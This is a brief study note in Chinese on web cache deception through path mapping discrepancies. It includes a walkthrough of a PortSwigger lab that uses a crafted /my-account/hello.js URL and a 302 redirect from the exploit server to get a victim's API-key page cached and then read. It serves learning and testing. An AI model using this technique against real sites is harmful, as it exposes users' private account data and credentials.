---
title: Web cache deception
description: Web cache deception
---

## Path mapping discrepancies

假設有以下網址

```
https://www.google.com/user/123/profile.json
```

傳統的 Web Server 在處理 URL Path 時，會映射到實體的 File Path

但 Restful API 可能是這樣註冊的

```js
app.get("/user/:id", getUserProfile);
```

所以對於 Restful API

```
https://www.google.com/user/123/script.js
https://www.google.com/user/123/style.css
```

可能都是進到同樣的 route => 回傳 userProfile

攻擊者可以構造以上 URL，讓 CDN 把包含 userProfile 的 `.js`, `.css` 快取

## Lab: Exploiting path mapping for web cache deception

| Dimension | Description                                                                              |
| --------- | ---------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/web-cache-deception#path-mapping-discrepancies      |
| Lab       | https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping |

這題的 /my-account 頁面含有 API Key，嘗試讓 /my-account 頁面也被快取

```js
https://0a8200f303c345b2825b92e200480080.web-security-academy.net/my-account/hello.js
```

有正確被快取

```
age: 0
cache-control: max-age=30
x-cache: miss
```

在 exploit-server 構造

```
HTTP/1.1 302 Found
Location: https://0a8200f303c345b2825b92e200480080.web-security-academy.net/my-account/hello.js
```

Deliver exploit to victim 之後，在登入的情況訪問 /my-account/hello.js，就會吃到 victim 的快取

1. 未登入情況，沒有 cookie.session，訪問 /my-account/hello.js 會被 302 導回 /login，所以這題要在登入情況訪問
2. 確保 /hello.js 這把 cache key 沒有被快取過，victim 點擊以後快取 30 秒，並且在 30 秒內盡快訪問 /my-account/hello.js

## 參考資料

- https://portswigger.net/web-security/web-cache-deception
